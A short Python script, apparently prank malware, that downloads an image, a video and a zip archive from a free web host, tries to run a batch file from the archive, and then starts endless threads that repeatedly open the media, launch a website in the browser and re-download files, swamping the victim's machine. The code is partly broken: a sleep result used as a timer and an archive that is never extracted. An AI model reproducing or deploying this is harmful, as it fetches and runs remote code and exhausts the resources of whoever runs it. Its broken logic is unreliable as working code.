import os
import time
import webbrowser
import threading
import subprocess
os.system('echo off')
os.system('pip install wget')

import wget

# Set up the image URL
image_url = "https://i.ibb.co/pJcwYbX/get-cheesed.jpg"
video_url = "https://cheest.000webhostapp.com/get_cheese_try_2.mp4"

# Use wget download method to download specified image url.
image_filename = wget.download(image_url)
video_filename = wget.download(video_url)
download = True

timer = time.sleep(30)
bat_url = "https://cheest.000webhostapp.com/rip.zip"
bat_filename = wget.download(bat_url)
#https://thispointer.com/python-how-to-unzip-a-file-extract-single-multiple-or-all-files-from-a-zip-archive/#:~:text=To%20unzip%20it%20first%20create,()%20on%20that%20object%20i.e.&text=It%20will%20extract%20all%20the%20files%20in%20zip%20at%20current%20Directory.
#hier boven om het te unzippen
while timer >= 0:
    time.sleep(0)
while timer <= 1:
    subprocess.call([r'rip.bat'])


def infiniteloop1():
    while download == True:
        os.startfile('get-cheesed.jpg')
def infiniteloop2():
    while download == True:
        os.startfile("get cheese try 2.mp4")
        time.sleep(1)
def infiniteloop3():
    while download == True:
        webbrowser.open('http://www.kaasislekker.nl')
def infiniteloop4():
    while download == True:
        image_filename = wget.download(image_url)

thread4 = threading.Thread(target=infiniteloop4)
thread4.start()

thread1 = threading.Thread(target=infiniteloop1)
thread1.start()

thread2 = threading.Thread(target=infiniteloop2)
thread2.start()

thread3 = threading.Thread(target=infiniteloop3)
thread3.start()
